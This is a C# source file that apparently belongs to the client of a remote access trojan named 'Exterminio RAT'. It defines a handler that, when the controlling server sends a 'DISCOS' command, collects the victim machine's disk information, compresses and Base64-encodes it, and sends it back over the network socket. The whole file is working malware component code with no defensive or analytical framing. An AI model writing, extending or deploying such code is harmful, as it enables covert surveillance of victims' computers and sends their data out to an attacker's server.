using System;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Exterminio_RAT_Cliente
{
    public class DiskDetectionHandler
    {
        private readonly Form1 mainForm;

        public DiskDetectionHandler(Form1 form)
        {
            mainForm = form;
        }

        public Task HandleDiskDetectionCommand(NetworkStream stream, System.Threading.Mutex socketMutex = null)
        {
            try
            {
                Console.WriteLine("Recibido comando DISCOS, iniciando detección de discos...");
                
                // Obtener información de discos
                string diskInfo = InfoDiscosFormatoEspecifico.ObtenerInformacionDiscosFormateada();
                Console.WriteLine($"Información de discos obtenida: {diskInfo}");
                
                // Convertir a bytes
                byte[] diskInfoBytes = Encoding.UTF8.GetBytes(diskInfo);
                Console.WriteLine($"Información convertida a bytes: {diskInfoBytes.Length} bytes");
                
                // Comprimir con Deflate
                byte[] compressedData = CompressData(diskInfoBytes);
                Console.WriteLine($"Datos comprimidos: {compressedData.Length} bytes");
                
                // Enviar datos comprimidos con formato "DISCOS:Base64" en una sola operación
                string diskMessage = "DISCOS:" + Convert.ToBase64String(compressedData);
                byte[] diskBytes = Encoding.UTF8.GetBytes(diskMessage);
                
                // Usar Mutex para proteger el envío por socket
                if (socketMutex != null)
                {
                    if (socketMutex.WaitOne(5000)) // Esperar máximo 5 segundos
                    {
                        try
                        {
                            Console.WriteLine("Mutex de socket adquirido, enviando datos de discos...");
                            // Usar Write síncrono para mantener el contexto del Mutex
                            stream.Write(diskBytes, 0, diskBytes.Length);
                            Console.WriteLine($"Datos de discos enviados completamente: {diskBytes.Length} bytes");
                        }
                        finally
                        {
                            socketMutex.ReleaseMutex();
                            Console.WriteLine("Mutex de socket liberado");
                        }
                    }
                    else
                    {
                        Console.WriteLine("Timeout al adquirir Mutex de socket");
                        throw new Exception("Timeout al enviar datos de discos por socket");
                    }
                }
                else
                {
                    // Enviar sin Mutex si no se proporciona
                    stream.Write(diskBytes, 0, diskBytes.Length);
                    Console.WriteLine($"Datos de discos enviados completamente: {diskBytes.Length} bytes");
                }
                
                Console.WriteLine("Información de discos enviada exitosamente al servidor");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en detección de discos: {ex.Message}");
            }
            
            return Task.CompletedTask;
        }

        private byte[] CompressData(byte[] data)
        {
            using (MemoryStream originalStream = new MemoryStream(data))
            using (MemoryStream compressedStream = new MemoryStream())
            {
                using (DeflateStream deflateStream = new DeflateStream(compressedStream, CompressionMode.Compress))
                {
                    originalStream.CopyTo(deflateStream);
                }
                return compressedStream.ToArray();
            }
        }
    }
}
